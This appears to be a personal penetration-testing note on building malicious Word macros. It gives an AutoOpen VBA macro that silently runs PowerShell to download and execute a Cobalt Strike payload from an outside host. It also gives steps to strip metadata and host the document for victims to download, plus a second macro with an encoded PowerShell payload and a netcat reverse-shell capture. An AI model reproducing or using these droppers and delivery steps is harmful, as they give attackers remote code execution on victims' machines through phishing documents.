---
creation date: September 22nd 2022
last modified date: September 22nd 2022
aliases: []
tags: #🧰
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #🧰  

# [[VBA Macro]]  
___

## Description:
VBA is an implementation of Visual Basic that is very widely used with Microsoft Office applications - often used to enhance or augment functionality in Word and Excel for data processing etc.

## CobaltStrike
You can create a macro in a Word document by going to **View > Macros > Create**.  Change the "Macros in" field from "All active templates and documents" to "Document 1". Give the macro a name and click **Create**.

``` 

Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120/a'))"

End Sub

```


In Cobalt Strike, go to **Attacks > Web Drive-by > Scripted Web Delivery (S)** and generate a 64-bit PowerShell payload for your HTTP listener. The URI path can be anything, Type should be powershell. Copy and paste into your VBA (remember to add double quotes around command).


To prepare the document for delivery, go to **File > Info > Inspect Document > Inspect Document**, which will bring up the Document Inspector. Click **Inspect** and then **Remove All** next to **Document Properties and Personal Information**. This is to prevent the username on your system being embedded in the document.


Next, go to **File > Save As** and browse to `C:\Payloads`. Give it any filename, but in the **Save as type** dropdown, change the format from **_.docx_** to **Word 97-2003 (.doc)**. 

host the file on the Team Server so we can simply send a link for them to download and execute. Go to **Attacks > Web drive-by > Host File**. Select **demo.doc** and provide a URI to access it on. 

Run the macro on the victim's machine to get a beacon.


## Powershell and NC

```
Sub AutoOpen()
 MyMacro
End Sub
Sub Document_Open()
 MyMacro
End Sub
Sub MyMacro()
 Dim Str As String
 
 Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
 Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
 Str = Str + "TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A"
 Str = Str + "EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg"
 Str = Str + "ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY"
 Str = Str + "gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB"
 ...
 Str = Str + "AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac"
 Str = Str + "AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB"
 Str = Str + "lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA"
 Str = Str + "FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA"
 Str = Str + "AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"
 Str = Str + "QA="
 CreateObject("Wscript.Shell").Run Str
End Sub
```

```
kali@kali:~$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 59111
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Users\Offsec>
```
___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 22nd 2022 (03:33 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
